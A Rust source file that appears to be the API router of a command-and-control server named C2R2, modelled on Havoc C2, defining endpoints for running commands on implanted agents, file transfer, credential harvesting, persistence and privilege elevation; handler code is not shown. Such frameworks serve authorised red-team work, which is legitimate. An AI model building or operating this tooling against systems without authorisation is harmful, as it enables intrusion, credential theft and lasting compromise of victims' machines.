//! Team Client API Module
//!
//! This module provides a REST/WebSocket API for team clients to communicate
//! with the C2R2 server. This is similar to how Havoc C2 and other modern
//! C2 frameworks handle team client communication.
//!
//! API Endpoints:
//! - GET  /api/agents          - List all connected agents
//! - GET  /api/agents/:id      - Get agent details
//! - POST /api/agents/:id/cmd  - Execute command on agent
//! - POST /api/agents/all/cmd  - Execute command on all agents
//! - WS   /api/events          - WebSocket for real-time events

mod handlers;
mod models;
mod state;
mod websocket;

pub use models::*;
pub use state::*;

use axum::{
    routing::{get, post},
    Router,
};
use std::sync::Arc;
use tower_http::cors::{Any, CorsLayer};

/// Create the API router with all endpoints
pub fn create_api_router(state: Arc<ApiState>) -> Router {
    let cors = CorsLayer::new()
        .allow_origin(Any)
        .allow_methods(Any)
        .allow_headers(Any);

    Router::new()
        // Agent endpoints
        .route("/api/agents", get(handlers::list_agents))
        .route("/api/agents/:id", get(handlers::get_agent))
        .route("/api/agents/:id/cmd", post(handlers::send_command))
        .route("/api/agents/:id/download", post(handlers::download_file))
        .route("/api/agents/:id/upload", post(handlers::upload_file))
        .route("/api/agents/:id/listdir", post(handlers::list_directory))
        .route("/api/agents/:id/cd", post(handlers::change_directory))
        .route("/api/agents/:id/pwd", post(handlers::get_cwd))
        .route(
            "/api/agents/:id/harvest",
            post(handlers::harvest_credentials),
        )
        .route("/api/agents/:id/persist", post(handlers::set_persistence))
        .route(
            "/api/agents/:id/persist_remove",
            post(handlers::remove_persistence),
        )
        .route("/api/agents/:id/beacon", post(handlers::configure_beacon))
        .route("/api/agents/:id/elevate", post(handlers::elevate_agent))
        .route("/api/agents/all/cmd", post(handlers::send_command_all))
        // Authentication
        .route("/api/auth/login", post(handlers::login))
        .route("/api/auth/logout", post(handlers::logout))
        // WebSocket for real-time events
        .route("/api/events", get(websocket::events_handler))
        // Status
        .route("/api/status", get(handlers::server_status))
        .layer(cors)
        .with_state(state)
}
